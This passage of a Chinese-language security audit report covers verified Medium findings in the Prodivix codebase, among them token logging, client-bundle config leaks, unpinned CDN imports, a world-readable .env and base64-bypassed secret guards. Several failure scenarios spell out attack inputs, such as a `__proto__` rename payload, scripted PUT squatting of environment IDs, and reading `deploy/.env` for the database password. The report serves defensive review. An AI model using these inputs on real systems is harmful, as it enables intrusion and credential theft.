**验证备注**: 已核实 aiSettingsStore.ts:12-24:zustand persist -> createJSONStorage(() => localStorage),键为 'prodivix-ai-settings',没有 partialize,因此整个 ProdivixAiSettings 对象都会被写入。packages/ai/src/settings/aiSettings.ts:13 在 openai-compatible 变体上声明了可选的 apiKey,BlueprintAssistantSettingsModal 的 toSettings(第 75 行)-> saveSettings/setSettings(约第 174 行)写入去除空白后的 key。useAuthStore.clearSession(useAuthStore.ts:42)只重置 token/user/expiresAt,因此该 key 在登出后仍然保留。严重级别从 critical 下调:这并不涉及服务端 secret-broker 不变量。specs/implementation/llm-integration-foundation.md:136 明确把「保存 API key 或 endpoint 设置」划归 Web 层,该功能在设计上就是客户端侧的(discoverOpenAICompatibleModels 使用 window.fetch;openAICompatibleProvider 在浏览器中设置 Authorization 头,见 providers/openAICompatibleProvider.ts:215,264),因此该 key 必然驻留在浏览器中,无论是否持久化,任何 XSS 在使用时刻都能将其外泄。真正的增量风险是明文静态持久化加上登出不清除——属于本地 profile 层面的暴露(共享机器、具备存储访问权限的扩展),而非多租户或服务端沦陷。Medium。

##### M-SEC-02 UseSecret 把解密后的 secret material 交给 consumer,但当 consumer 返回错误时不写入 'secret-used' 审计行

- **位置**: [`apps/backend/internal/modules/environment/store.go:465`](apps/backend/internal/modules/environment/store.go#L465)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: `UseSecret` 解密 secret 并调用 `consumer(material)`,只有在 consumer 返回 nil 时才会写入 kind 为 `'secret-used'` 的 `execution_environment_resolution_audit` 行。所有 consumer 错误路径——包括明文已经离开进程的那些情况——都会提前返回,不产生任何审计证据。同样的顺序还意味着:请求 context 被取消,或审计 INSERT 遇到瞬时数据库故障,都会把一次已完成的 secret 使用变成错误返回,而没有任何持久记录。审计表是 secret 曾被解析使用的唯一持久证据,因此审计轨迹恰恰在运维人员最需要看到的失败场景中系统性地漏报。

**失败场景**: `apps/backend/internal/modules/remoteexecution/data_gateway.go:734` 传入的 consumer 会设置 `request.Headers[secretHeader] = string(material)`,然后调用 `execute()`(向第三方端点发起的出站 HTTP 请求)。在授权有效但上游超时或返回传输错误的情况下,`execute()` 返回错误,consumer 将其向上传播,`UseSecret` 在第 466 行返回。结果:解密后的 API token 已经发送到外部端点,但 `SELECT * FROM execution_environment_resolution_audit WHERE kind='secret-used'` 中没有该 grant 对应的任何一行。`secretEchoDetected` 路径(data_gateway.go:743)同样如此,而在该路径中 secret 可以证明已到达上游并在响应体中回显。

**修复建议**: 在调用 consumer 之前写入 `secret-used` 审计行(或者事前记录一次尝试、事后记录一行结果),并使用与请求 context 分离的 context,使客户端取消无法压制该写入。把 consumer 的错误记录进审计记录,而不是跳过写入。

**验证备注**: 证据与 store.go:464-471 逐字一致:第 465 行的 consumer(material) 拿到解密后的明文,任何 consumer 错误都会在第 470 行的 'secret-used' INSERT 之前返回。该路径可从真实生产代码到达——data_gateway.go:734 的 consumer 设置 request.Headers[secretHeader] 后调用 execute(),在 secret 已被发送之后返回传输错误;secretEchoDetected 分支同样在 secret 可证明已到达上游并回显之后返回错误。ADR 46(specs/decisions/46.auth-and-server-runtime.md:177)规定 grant/use/revoke 由 environment 审计持久化,因此该缺口与既定契约相抵触。反向风险同样真实:context 被取消或审计 INSERT 失败,会让 UseSecret 在 consumer 成功之后返回错误,进而使 data_gateway 走 releaseMutationRetry。严重级别从 high 下调:没有任何 secret 值流向被禁止的接收端(不变量 7 完好),而且 IssueGrant(store.go:387)仍会写入一行持久的 'grant-issued' 记录,携带 grant/environment/revision/workspace/principal/session/provider/purpose/resource——缺失的只是使用事件本身以及 binding_id/field,因此这属于审计完整性/证据缺陷,而非泄露或授权绕过。

##### M-SEC-03 execution_environments.id 是客户端提供的全局主键,允许跨租户抢占标识符并形成存在性预言机

- **位置**: [`apps/backend/internal/modules/environment/store.go:203`](apps/backend/internal/modules/environment/store.go#L203)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-auth-project-env`

**详情**: environment id 直接来自 URL(handler.go:106 中的 `c.Param("environmentId")`),而 `execution_environments.id` 是一个全局的 `TEXT PRIMARY KEY`(apps/backend/internal/platform/database/database.go:190),并未按 workspace 或所有者作用域划分。`PutSnapshot` 仅按 id 查找该行;如果该行存在且属于另一个 workspace/所有者,它会返回 `ErrNotFound`,`respondStoreError` 将其映射为 404。由于没有删除端点,一旦占用某个 id 就是永久占用。201 与 404 的区分还会告诉任何已认证用户:某个任意 environment id 是否已被其他租户占用。

**失败场景**: 攻击者(任何已注册用户)执行 `PUT /api/workspaces/{their-own-workspace}/environments/production` 并得到 201。此后其他任何租户执行 `PUT /api/workspaces/{their-own-workspace}/environments/production` 都会永久得到 `404 ENV-4004 "Execution environment was not found."`,而且没有任何方式释放该 id。脚本化地对可能的名称(`production`、`staging`、`default`、`prod`)发起数千次 PUT,就能对整个部署封锁这些 id,并且每一个 404 都确认该 id 已被另一个租户占用。

**修复建议**: 让 environment 身份按 workspace 作用域划分:把主键改为 `(workspace_id, id)` 并让每次查找都带上作用域(`WHERE workspace_id = $1 AND id = $2`),或者由 `(workspace_id, environmentID)` 派生一个服务端代理 id,使一个租户的命名空间不会与另一个租户冲突。

**验证备注**: 已在源码中核实。database.go:194 将 execution_environments 声明为 `id TEXT PRIMARY KEY`(全局,而非按 workspace 作用域);其后的 `CREATE UNIQUE INDEX ... ON execution_environments(workspace_id, id)` 是冗余的,并未增加任何作用域限制。store.go:203 使用 `WHERE id = $1` 查询,没有 workspace/所有者谓词;store.go:214-216 在查到的行属于另一个 workspace/所有者时返回 ErrNotFound,handler.go:70-71 将其映射为 404 ENV-4004 且不带任何可重试提示,与空闲 id 的 201 Created(handler.go:114)形成对比——一个可用的存在性预言机。environmentId 原样来自 c.Param("environmentId")(handler.go:106),仅由 canonicalIdentifier `^[A-Za-z0-9][A-Za-z0-9._:-]{0,255}$`(models.go:17)过滤,因此 `production`/`staging`/`default` 都会被接受。routes.go 只注册了 PUT 和 GET——没有删除路径,所以被占用的 id 是永久性的。任何已认证用户都能到达该路径:workspace 可通过创建项目 / POST /workspaces/import-local-project 获得,而 store.go:199 的 workspace 所有权探测只检查攻击者**自己**的 workspace,而非目标 id。仓库内的 environment id 都是可读名称(`environment-main`、`environment-server`),因此即使没有攻击者,冲突也很可能发生。没有任何守卫、测试或调用方约束能阻止它。Medium 的严重级别站得住脚:已认证用户可发起的、跨租户的、无法通过 API 修复的可用性拒绝,加上轻微信息泄露;没有机密性或完整性影响。

##### M-SEC-04 生产服务器以 debug 模式运行 gin,因此 panic 恢复会把请求头中的原始 session/terminal token 写入进程日志

- **位置**: [`apps/backend/server.go:51`](apps/backend/server.go#L51)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `be-platform`

**详情**: `gin.Default()` 会安装 gin 的 Recovery 中间件,但生产构建中没有任何地方调用 `gin.SetMode(gin.ReleaseMode)`,镜像(apps/backend/Dockerfile)也从未设置 GIN_MODE。gin v1.11.0 在 mode.go 中的 `init()` 会在 GIN_MODE 为空且没有 `test.v` 时默认使用 DebugMode。在 debug 模式下,`CustomRecoveryWithWriter` 会走 `IsDebugging()` 分支并记录 `secureRequestDump(c.Request)`,而它*只*会遮蔽以 "Authorization:" 开头的行。该服务还通过 `X-Auth-Token` 作为替代 bearer 载体进行认证(apps/backend/internal/modules/auth/token.go:17),以及通过 `x-prodivix-terminal-token`(apps/backend/internal/modules/remoteexecution/terminal.go:322,由 packages/runtime-remote/src/remoteExecutionTerminalHttpTransport.ts:144 发送)。这两者都不会被遮蔽。这违反了「secret 值绝不能进入日志」这一不变量。

**失败场景**: 浏览器客户端带着请求头 `x-prodivix-terminal-token: <live terminal access token>` 调用 POST /api/remote-executions/<id>/terminal-sessions/<sid>/read;该处理器内部任何 nil map/nil 指针 panic 都会让 gin 把 `x-prodivix-terminal-token: <token>` 原样写入 stderr,日志聚合器随后将其持久化。任何已认证端点上的 `X-Auth-Token: <session token>` 也会发生同样的事,把一份可用的会话凭据交给日志读者。

**修复建议**: 在 `cfg.Environment != "development"` 时于 NewServer 中调用 `gin.SetMode(gin.ReleaseMode)`(cfg.Environment 已经加载,目前并未用于此处),和/或在 apps/backend/Dockerfile 中设置 `ENV GIN_MODE=release`。更好的做法:安装自定义的 Recovery,只记录方法、路由模板和状态码——绝不记录请求头。

**验证备注**: 已完整核实。git grep 显示 gin.SetMode 只在 *_test.go 文件中被调用(TestMode);apps/backend/Dockerfile、deploy/docker-compose.ghcr.yml(仅设置 APP_ENV=production)、deploy/start-app.sh 以及任何工作流中都没有设置 GIN_MODE,而 gin v1.11.0 的 mode.go 先把 ginMode 初始化为 debugCode 然后执行 SetMode(os.Getenv("GIN_MODE")),因此容器运行在 DebugMode。gin v1.11.0 的 recovery.go 中 CustomRecoveryWithWriter 会走 IsDebugging() 分支并记录 secureRequestDump(c.Request),其净化逻辑只重写前缀为 "Authorization:" 的行——httputil.DumpRequest(r, false) 会原样输出所有其他请求头。两种替代凭据载体都真实存在:auth/token.go:17 返回 c.GetHeader("X-Auth-Token") 作为会话 bearer,remoteexecution/terminal.go:322 读取 X-Prodivix-Terminal-Token(CORS 中间件明确把两者列入允许名单)。因此任何处理器中的 panic 都会把一个有效的 session 或 terminal token 写入 stderr。严重级别从 high 下调:该泄露无法被攻击者按需触发——它需要真的发生一次 panic,而且无论处于何种模式,gin 在 brokenPipe 分支都会转储同样的请求头,因此设置 ReleaseMode 是必要但不充分的修复,并非缺陷的全部。

##### M-SEC-05 Server/edge 数据源的配置字面量(base URL、endpoint、字面量 authorization)被原样嵌入导出的客户端产物包

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts:46`](packages/prodivix-compiler/src/react/standaloneDataLiveRuntime.ts#L46)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: `projectStandaloneDataDocuments` 会把每一份 `data-source` 文档——不论其 `source.runtimeZone` 为何——投影进生成的 `src/prodivix-data-runtime.ts` 客户端模块(`standaloneDataRuntime.ts:161` 用 `JSON.stringify` 将其插值)。`projectConfiguration` 会为每个 `kind: 'literal'` 条目保留完整的 `value`。对于 `server`/`edge` zone,生成的客户端代码从不读取该配置:`invokeLiveHttp`(第 1458 行)、`invokeLiveGraphql`(第 1618 行)和 `invokeLiveAsyncApi`(第 1753 行)都在触及 `configurationByKey` *之前*就返回 `invokeRemoteDataGateway(input)`,而 `invokeRemoteDataGateway` 只通过桥接发送 `documentId`/`operationId`/`adapterId`/`input`(第 1183-1193 行)。该文件自身的文档注释声称「environment 与 Secret 身份绝不进入客户端源码」,但字面量的服务端专用值确实进入了。`packages/data/src/dataDocument.ts` 只对*订阅*操作要求 `secret-ref` 形式的 authorization,因此在 query/mutation 上写一个字面量 `authorization` 是可创作的,并且能通过 `analyzeWorkspaceDataRuntimeTarget`(它只在 `client` zone 的数据源上拒绝 environment/secret 引用)。

**失败场景**: Workspace 中含有一份 data-source 文档,其 `source.runtimeZone: 'server'`,`adapterId: 'core.http'`,`configurationByKey: { baseUrl: { kind: 'literal', value: 'https://billing-internal.corp.example/v1' }, authorization: { kind: 'literal', value: 'Basic ZGVwbG95OnMzY3IzdA==' } }`。`compileWorkspaceToExportProgram` 发出的 `src/prodivix-data-runtime.ts` 中包含 `const dataDocuments = {"billing":{..."configurationByKey":{"authorization":{"kind":"literal","value":"Basic ZGVwbG95OnMzY3IzdA=="},"baseUrl":{"kind":"literal","value":"https://billing-internal.corp.example/v1"}}...}}`。该模块会被打包并分发到每一个浏览器,尽管 server zone 数据源的客户端代码路径从不读取它。

**修复建议**: 仅在 `value.source.runtimeZone === 'client'` 时投影 `configurationByKey`(数据源级与操作级);对 `server`/`edge` 则发出 `configurationByKey: {}`(或只发出客户端桥接确实需要的键,即没有)。Gateway 会在服务端从 canonical Workspace 解析配置,因此不会丢失任何东西。

**验证备注**: 证据与文件完全一致(standaloneDataLiveRuntime.ts:9-49)。我复现了该行为:编译一个唯一数据源的 runtimeZone 为 'server'、adapterId 为 'core.graphql'、并带有字面量 endpoint 的 workspace,发出的 src/prodivix-data-runtime.ts 包含 `const dataDocuments = {"data-products":{..."runtimeZone":"server","configurationByKey":{"endpoint":{"kind":"literal","value":"https://api.example.test/graphql"}}..."document":{"kind":"literal","value":"subscription WatchProducts {...}"}...}}`,且零诊断;客户端路径(invokeLiveHttp/GraphQL/AsyncApi)确实在读取 configurationByKey 之前就返回 invokeRemoteDataGateway,所以可以证明客户端从不使用它。golden 套件自己的 fixture(goldenG2DataTargetMatrix liveWorkspaceFor(...,'server'))也以同样方式分发字面量的服务端 base URL。因此过度投影是真实存在的。但 'critical' 站不住脚:projectConfiguration **确实**剥离了每个 environment-ref/secret-ref 的 value(只保留 `kind`),而那正是本系统真正的 Secret 模型,因此该文件的文档注释字面上是成立的,不变量 7 没有被突破。所声称的凭据泄露需要创作者绕过 Secret 模型、把明文凭据键入 `literal`,而这本身就已经把凭据放进了 Workspace 文档、编辑器 UI 和 Git 投影——导出并不是泄露边界。此外,在默认的静态客户端目标下,server zone 数据源会触发 error 级诊断 WKS-EXPORT-DATA-SERVER-GATEWAY-REQUIRED,因此干净(无诊断)的路径是 execution-parent-gateway/Remote Preview 项目,而不是一个无条件公开的生产产物包。可成立的结论是:server/edge 专用配置(内部端点、HTTP 路径、GraphQL 文档)被披露在客户端从不读取但会被浏览器下载的源码中——信息泄露,medium。

##### M-SEC-06 图标注册表在编辑器源内执行从 esm.sh 拉取的未固定版本第三方 ESM

- **位置**: [`packages/pir-react-renderer/src/host/iconRegistry.ts:487`](packages/pir-react-renderer/src/host/iconRegistry.ts#L487)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-pir`

**详情**: `ensureFontAwesomeReady` / `ensureHeroiconsReady` 调用 `loadEsmCandidates`,后者对绝对 URL `https://esm.sh/...` 执行动态 `import()`(第 373-387 行)。FontAwesome 的 URL 完全没有版本说明符,因此总是解析到 esm.sh 当前提供的最新版本;既没有完整性校验,也没有允许列表,更没有 sandbox。导入的模块以第一方脚本身份在应用源(origin)中执行,可完全访问 `document`、`localStorage`/会话令牌以及 IndexedDB 中的 Workspace 副本。`ensureHostReactImportMap` 还会在运行时向 `document.head` 注入 `<script type="importmap">`(第 361-371 行),也就是在应用自身的模块图已经加载之后注入,这也是此处 `external=react` 解析很脆弱的原因。`cacheBust = Date.now().toString(36)` 查询参数使每次拉取都成为全新的、不可复现、不可缓存的产物。

**失败场景**: 用户打开 Inspector 图标选择器并选择 "Font Awesome" provider。`IconPickerModal` 调用 `ensureIconProviderReady('fontawesome')` -> `ensureFontAwesomeReady()` -> `import('https://esm.sh/@fortawesome/react-fontawesome?target=es2022&external=react&v=<now>')`。被攻陷的 esm.sh 响应、未固定版本的包被劫持的上游发布,或 TLS/DNS 劫持,都会在 Prodivix 源中静默运行攻击者的 JavaScript,进而读取用户的认证会话并外传 canonical Workspace 副本。没有任何用户同意、CSP 允许列表或版本固定对此加以约束。

**修复建议**: 不要在运行时从第三方 CDN 加载图标库。要么把 FontAwesome/Heroicons 作为工作区依赖打包(如 `lucide-react` 已有的做法)并静态解析,要么把拉取改为经由 `apps/backend` 提供的第一方、版本固定、带完整性校验的代理,并强制执行排除 esm.sh 的 `script-src`/`connect-src` CSP。至少也要固定一个精确版本并去掉 `Date.now()` 缓存破坏参数,使产物可复现。

**验证备注**: 代码与引用内容完全一致:`loadEsmCandidates`(iconRegistry.ts:373-387)对绝对 https://esm.sh URL 执行动态 `import()`,FontAwesome 候选项(:485-494)不带版本说明符,没有 SRI/允许列表/sandbox,模块以第一方身份在编辑器源中执行。我确认 apps/web/index.html 没有下发任何 CSP,仓库中仅有的 CSP 属于 asset-delivery-host、plugin-sandbox 和 remote-preview-host —— 没有一个覆盖编辑器源。可达性是真实的:IconPickerModal.tsx:165/344 调用 `ensureIconProviderReady(providerId)`,iconRegistry.ts:656-662 以 `ensureReady: ensureFontAwesomeReady` 注册了 'fontawesome'。两点更正。(1)关于 `ensureHostReactImportMap` 的子论点对生产环境而言不成立:apps/web/index.html:7 已在 <head> 中声明了 `<script id="prodivix-esm-importmap" type="importmap">`,其 id 正是 `ensureHostReactImportMap` 检查的那个(hostReactImportMap.ts:1),因此运行时注入根本不会触发,"在模块图加载之后注入 / 脆弱" 的推理并不适用。(2)严重性:esm.sh 是有文档记载的架构依赖来源(docs/architecture/overview.md:61 将 esm.sh 映射到外部库;该流程以 'Loading icons from esm.sh...' 的形式呈现给用户),该 provider 非默认且需用户主动选择,Heroicons 也已固定在 @2.2.0 —— 因此这是一项已被接受的设计,附带一处具体的缺少版本固定/缺少 SRI 的弱点(低概率、高影响的 CDN/供应链攻陷),属于 medium 而非 high。

##### M-SEC-07 validatePropsTransform 接受 `__proto__` 作为重命名目标,而两个消费方都直接把它赋值到 props 对象上

- **位置**: [`packages/plugin-contracts/src/contributionValidation.ts:121`](packages/plugin-contracts/src/contributionValidation.ts#L121)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-protocol-contracts`

**详情**: `validatePropsTransform` 是 `renderPolicy` 与 `codegenPolicy` 两个 contribution point 上 `props.rename` / `props.defaults` / `props.omit` 的失败关闭语义守卫。它检查重复的重命名来源、重复的重命名目标、source===target、重命名链、重复的 omit 以及 defaults/omit 冲突 —— 但从不拒绝会改动原型的属性名。`propertyName` 的 schema 定义允许这些名字:`'^[A-Za-z_$][A-Za-z0-9_$-]*$'`(renderPolicyContributionV2Schema.generated.ts:57、codegenPolicyContributionSchema.generated.ts:72)可匹配 `__proto__`、`constructor` 和 `prototype`。已校验变换的两个生产消费方都执行了无守卫的计算属性赋值:`apps/web/src/plugins/platform/contributions/renderPolicyResolver.ts:47` 与 `packages/prodivix-compiler/src/core/codegenPolicy.ts:159` 都执行 `props[to] = props[from]`。注意这在上游并未被拦截 —— 重命名目标是一个普通的 JSON _字符串值_,因此 `validateJsonValue` 的原型守卫(只捕捉文档中字面量的 `__proto__` _键_)并不适用。

**失败场景**: 某插件下发一个 renderPolicy v2 contribution,其 `rules[0].props = { defaults: { seed: { children: "injected", className: "attacker" } }, rename: [{ from: "seed", to: "__proto__" }] }`。`validateRenderPolicyContribution` 返回 ok(没有规则被违反)。渲染时 `resolveAdapterProps` 构造 `props = { seed: {...}, ...resolvedProps }`,此时 `hasOwnProperty(props,'seed')` 为真而 `hasOwnProperty(props,'__proto__')` 为假,于是执行 `props['__proto__'] = props.seed` —— 这会触发 `__proto__` setter 并重新指定 `props` 的父原型,而不是新增属性,随后删除 `seed`。返回的 props 对象此时自有属性为零(因此 `JSON.stringify`、`Object.entries`、`cloneAndFreezeJson` 以及任何对已解析 props 的审计/序列化都只看到 `{}`),而 `props.children` 读出 `"injected"`、`props.className` 读出 `"attacker"` —— 都来自插件控制的原型。同样的输入在 codegen 路径上会静默地把被重命名的 prop 从生成源码中丢掉,导致渲染出的画布与导出的代码不一致。

**修复建议**: 在 `validatePropsTransform` 中,对每个 `rename.from`、`rename.to`、`omit[i]` 以及 `Object.keys(defaults)` 条目,以 CONTRIBUTION_SCHEMA_VIOLATION 拒绝 `__proto__`、`constructor` 和 `prototype`,并在 render-policy-v2 与 codegen-policy-v1 两个 schema 中用 `not: { enum: [...] }` 收紧 `propertyName` 的 `$defs`。此外,把两个消费方改为 `Object.defineProperty(props, to, { value, enumerable: true, writable: true, configurable: true })`。

**验证备注**: 守卫缺口真实存在,我已复现。`validatePropsTransform`(contributionValidation.ts:111-197)检查重复的重命名来源/目标、source===target、重命名链、重复 omit 以及 defaults/omit 冲突,从不拒绝会改动原型的名称;`propertyName` 的模式在 renderPolicyContributionV2Schema.generated.ts:57 与 codegenPolicyContributionSchema.generated.ts:72 中确实是 `'^[A-Za-z_$][A-Za-z0-9_$-]*$'`,可匹配 `__proto__`。对 packages/plugin-antd/plugin/contributions/render-policy.json 设置 `rules[1].props = { defaults: { seed: {...} }, rename: [{ from: 'seed', to: '__proto__' }] }` 后运行真实的 `validateRenderPolicyContribution`,返回 ok:true(临时探针,已删除)。重放 `applyProps` 的原样实现(renderPolicyResolver.ts:44-49)得到自有键 `[]`、`JSON.stringify` -> `'{}'`、`props.children === 'injected'`、`props.className === 'attacker'`,且原型不再是 Object.prototype。prodivix-compiler/src/core/codegenPolicy.ts:155-160 存在完全相同的无守卫赋值。不过审查者对下游影响有所夸大:这是逐对象的原型重指,而非 Object.prototype 污染,且注入的值永远不会到达 React —— renderPolicyResolver.ts:142(`Object.freeze({ ...(declarative.props ?? props) })`)、renderPolicyResolver.ts:164 的 applySelection,以及 apps/web/src/pir/pirWebRendererHost.tsx:69-74(`{ ...(adapterResult?.props ?? input.resolvedProps) }`)都只展开自有可枚举属性,因此继承来的 props 被丢弃,得到的对象拥有干净的原型。因此站得住脚的缺陷是:一个失败关闭的契约守卫接受了某个键,从而把一次声明的重命名静默转成删除,并把插件控制的原型交给中间的渲染器/编译器对象 —— 而不是隐蔽的 prop 注入或渲染与 codegen 的不一致。严重性修正为 medium。

##### M-SEC-08 部署脚本以默认(全局可读)权限把生成的 Postgres 密码写入 deploy/.env

- **位置**: [`deploy/start-app.sh:148`](deploy/start-app.sh#L148)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: `write_env_file` 用普通的 shell 重定向截断/创建 `$ENV_FILE`,因此该文件继承进程 umask(常见的 022 默认值下为 0644),并且从不执行 chmod。脚本自身在第 238 行、当现有值为空/占位符/`postgres` 时生成一个 32 字符的 Postgres 密码,然后在第 154 行以明文持久化。脚本本身和 `deploy/README.md` 中都没有任何后续限制文件模式的措施。

**失败场景**: 运维人员在一台共享的裸金属主机上运行 `./deploy/start-app.sh`。新生成的数据库密码以 0644 模式写入 `deploy/.env`。任何非特权本地账户(包括同一台机器上被攻陷的低权限服务)都可以 `cat deploy/.env` 读到 `POSTGRES_PASSWORD`,从而获得对 Prodivix 数据库的完全访问权 —— 而该数据库保存着 canonical Workspace snapshot。

**修复建议**: 在写入之前就以受限方式创建该文件:在 heredoc 周围使用 `umask 077`(或先执行 `install -m 600 /dev/null "$ENV_FILE"`),并在 `write_env_file` 返回后执行 `chmod 600 "$ENV_FILE"`。

**验证备注**: 证据与 deploy/start-app.sh:148-155 原样一致。`grep -n 'chmod|umask' deploy/start-app.sh` 在整个文件中没有返回任何 chmod 或 umask;ENV_FILE 只在第 7、86、148、207-222、258、306、318-320 行被引用,没有一处限制文件模式。密码路径与描述完全一致:第 237 行检测空值/`postgres`/占位符,238 行从 /dev/urandom 生成 32 个字符,243-245 行保留它,write_env_file 在 154 行以明文持久化。第 207-208 行(`cp "$ENV_EXAMPLE_FILE" "$ENV_FILE"`)是另一条创建路径,同样会从被跟踪的 .env.example 得到 0644。deploy/README.md 只在第 20 行提到 `chmod +x ./start-app.sh` 的 chmod,从未涉及 .env。没有任何测试、包装脚本或 compose 层守卫限制该模式。严重性 medium 是站得住脚的、并未被夸大:该脚本自述为 "Prodivix bare-server deploy"(第 187 行),即明确面向共享裸金属主机,而该凭据保护的是保存 canonical Workspace snapshot 的 Postgres 实例。有一处细节并不推翻结论:如果运维人员此前手动 chmod 过 600,再次运行时 `cat >` 只会截断并保留更严格的模式 —— 但没有任何代码路径会在一开始就建立 600。

##### M-SEC-09 执行期机密泄露守卫扫描原始字节,而文件系统差异 artifact 以 base64 编码存储每个变更文件,因此任何写入 workspace 文件的机密都能通过守卫进入可下载的 artifact

- **位置**: [`apps/remote-runner-worker/src/rootlessPodmanSandbox.ts:1566`](apps/remote-runner-worker/src/rootlessPodmanSandbox.ts#L1566)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-security`

**详情**: `createExecutionSecretLeakGuard` 把受保护值作为字面 UTF-8 子串/字节序列进行匹配(`packages/runtime-core/src/executionSecretLeakGuard.ts:280-284`)。worker 对 artifact 对象运行 `outputGuard.inspectValue('artifact-content', result.artifacts ?? [])`,这些对象的 `contents` 是序列化后差异信封的 `Uint8Array`。但 `apps/remote-runner-worker/sandbox/entry.mjs:345-350` 中的 `createFilesystemDiffArtifact` 把每个文件正文都以 `contents.toString('base64')` 存储,因此原始机密字节根本不会字面出现在 artifact 中。control plane 一侧在 `putArtifact` 中应用的守卫也是同样情况。该泄露守卫是唯一一个失败关闭的控制手段,用于阻止已解析的 Server Function 机密进入已发布的 artifact(不变量:机密绝不能到达 artifact),而任何内容变换 —— 这里是 base64,gzip 或 JSON 字符串转义同理 —— 都会静默地使它失效。

**失败场景**: 一个带有 `environment.secretsByField` 的生产 Server Function 解析出它的机密,并出于调试目的把它写入 `/workspace/debug.log`(或它本来就会写的任何文件,例如一个回显请求头的缓存文件)。`entry.mjs` 遍历 `/workspace`,发现 `debug.log` 不在 `ignoredPaths`/`ignoredDirectories` 中,于是产出一条 `added` 变更,其 `runtime.contents` 为 `base64(secret)`。worker 的 `outputGuard.inspectValue('artifact-content', ...)` 找不到原始匹配,于是 `secretLeakDetected` 保持 false,`blockSecretLeak` 不被调用,差异 artifact 被上传,并通过 `GET /v1/executions/<id>/artifacts/<id>/content` 提供给任何持有该执行作用域的主体 —— 包括只持有 `workspace:read`、可以调用但无权编写该函数的 workspace 主体。

**修复建议**: 先解码再检查:在 `canonicalizeSandboxFilesystemDiff` 中对每个已解码的 `change.baseline.contents` / `change.runtime.contents` 字节数组运行守卫(它们在那里已经是解码后的形式),而不是只对重新编码后的信封运行。对任何其他包装了 base64 载荷的 artifact 媒体类型(preview/build bundle、Vitest 报告)也做同样处理。

**验证备注**: 已端到端验证,我无法推翻它。createExecutionSecretLeakGuard(executionSecretLeakGuard.ts:275-300)只做字面 UTF-8 匹配:containsText 使用 String.includes,containsBytes 是基于 utf8ToBytes(secret) 构建的 Aho-Corasick 匹配器;normalizeSecretValues(第 103-131 行)只做去重/排序/限界,不添加任何编码变体(没有 base64、没有 JSON 转义、没有百分号编码)。entry.mjs 的 contentRecord(第 345-350 行)把每个变更文件正文都存为 `contents.toString('base64')`,而整个差异信封在第 459 行又被 base64 一次,因此守卫所看到的内容中结构性地不存在原始机密字节。两处检查点都受影响:rootlessPodmanSandbox.ts:1566 的 `outputGuard.inspectValue('artifact-content', result.artifacts ?? [])` 和 workerAgent.ts:76-85 的 `guard.inspectBytes(surface, contents)`。可达性已确认:entry.mjs:857 无条件追加 createFilesystemDiffArtifact,包括在 `profile === 'production'` 的 Server Function 路径上(第 856 行),而该路径存在 secretMaterial。后果是守卫的 artifact-content 检查面对所有文件正文实际上完全失效 —— 该流水线中的每一份 artifact 载荷都是 base64。medium 是合适的级别:它需要项目自身的代码把自己的机密写入一个会被采集的文件,且提权范围仅限于持有该执行作用域的主体,而不是无关租户。

##### M-SEC-10 LLM 提供方 API key 以未加密形式持久化在 localStorage 的 `prodivix-ai-settings` 下

- **位置**: [`apps/web/src/ai/aiSettingsStore.ts:21`](apps/web/src/ai/aiSettingsStore.ts#L21)
- **类别**: security ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-security`

**详情**: `useAiSettingsStore` 通过 `createJSONStorage(() => localStorage)` 把整个 `ProdivixAiSettings` 对象 —— 对 `openai-compatible` 提供方而言其中包含 `apiKey`(`packages/ai/src/settings/aiSettings.ts:13`)—— 持久化到 `localStorage`,并且没有用 `partialize` 剥离该机密(相比之下 `useAuthStore` 至少声明了 `partialize`)。架构规则要求 localStorage 只能存放 UI 偏好,绝不能存放机密或领域持久化数据。该 key 随后又被读回,并从浏览器以 `Authorization: Bearer ${this.apiKey}` 发送(`packages/ai/src/providers/openAICompatibleProvider.ts:215`)到用户提供的 `baseURL`,而 `normalizeBaseURL`(`packages/shared/src/safety/url.ts:1`)只会去掉末尾斜杠 —— 它并不要求 `https:`,因此 `http://…` 的 base URL 会以明文发送该 key。

**失败场景**: 用户配置了一个 OpenAI 兼容提供方并填入自己的 API key。该 key 被原样写入 `localStorage['prodivix-ai-settings']`。任何在编辑器源(origin)中运行的脚本 —— 例如第一条发现中描述的未固定版本的 esm.sh 图标模块、恶意浏览器扩展,或任何反射型/存储型 XSS —— 只需一次 `localStorage.getItem` 调用即可读到它。另外,如果用户把 `http://10.0.0.5:8000/v1` 粘贴为 base URL,该 key 会通过明文 HTTP 传输。

**修复建议**: 添加 `partialize` 以把 `apiKey` 排除在持久化切片之外,只在会话期间把该 key 保留在内存中(或者由后端代理 LLM 调用,使该 key 永远不进入浏览器)。此外,在发出任何携带 `Authorization` 头的请求之前,让 `normalizeBaseURL` 拒绝回环地址之外的非 `https:` 源。

